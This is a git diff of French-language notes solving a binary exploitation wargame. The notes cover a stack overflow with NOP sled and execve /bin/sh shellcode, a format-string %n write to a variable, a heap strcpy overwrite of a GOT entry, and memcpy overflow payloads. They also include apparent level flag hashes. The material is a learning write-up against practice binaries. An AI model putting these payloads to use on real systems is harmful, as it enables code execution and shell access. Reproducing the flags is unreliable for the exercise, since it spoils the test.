@@ -8,7 +8,6 @@ https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-ret
 (python -c 'print "\x90" * 39 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x20\xa0\x04\x08" * 5'; cat) | ./level2
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 
-
 Level3:
 Just change the value of m to 0x40
 Gdb level3
@@ -17,9 +16,10 @@ It s format string vulnerability a cause de printf(buf)
 https://null-byte.wonderhowto.com/how-to/exploit-development-write-specific-values-memory-with-format-string-exploitation-0182112/
 On trouve la variable m: p &m
 (python -c 'print "\x8c\x98\04\x08" + "%x %x %46x %n"')
-%n => écrit le nor de carctere et le stock en memoire (ici a le memoire de m)
+%n => écrit le nbr de caractere et le stock en memoire (ici a le memoire de m)
 On doit avoir m == 64 donc on rajoute 44 caractère a un %x
 b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+
 Level4:
 Ca a lair d être la meme sauf qu il faut aller plus loin dans les caractères
    0x08048492 <+59>:	cmp    $0x1025544,%eax
@@ -42,7 +42,7 @@ malloc(8)                                        = 0x0804a028
 malloc(8)                                        = 0x0804a038
 strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAAAAAAA")  = 0x0804a018
 strcpy(0x41414141, "BBBBBBBBBB" <unfinished ...>
-Vizu du ltrace on peut voir que le deuxième strcpy essaye de mettre la valeur "BBBBBBBBBB" dans “0x41414141” du coup essayons de mettre l adresse de m 0x080484f4 dans l adresse qui call put 0x8048400
+Vizu du ltrace on peut voir que le deuxième strcpy essaye de mettre la valeur "BBBBBBBBBB" dans “0x41414141” du coup essayons d émettre l adresse de m 0x080484f4 dans l adresse qui call put 0x8048400
 Disas  0x8048400:
 0x08048400 <+0>:	jmp    *0x8049928
 Donc on prends 0x8049928 a la place de 0x8048400 parce que \x00
@@ -109,3 +109,7 @@ memcpy(0x0804a00c, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 200)
 Le return a la fin est le resultat de de la fonction operation +
 Trouver un moyen de rediriger le pointeur dans un shell code using memcpy ?
 On peut rediriger l adresse avec un overflow sur le memcpy qui va du coup overflow sur la prochaine variable. Du coup mettre l adresse d un shell code sur la prochaine variable ?
+run $(python -c 'print "\x90" * 25 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x43" * 58 + "\x70\xa0\x04\x08"')
+This works i have segfault \x43\x43\x43\x43
+$(python -c 'print "\x90\x90\x90\x90" + "\x24\xa0\x04\x08" + "\x90" * 17 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x43" * 58 + "\x10\xa0\x04\x08"')
+This works because it’s calling 0x0804a010 who is calling 0x0804a024 who has the shell code.
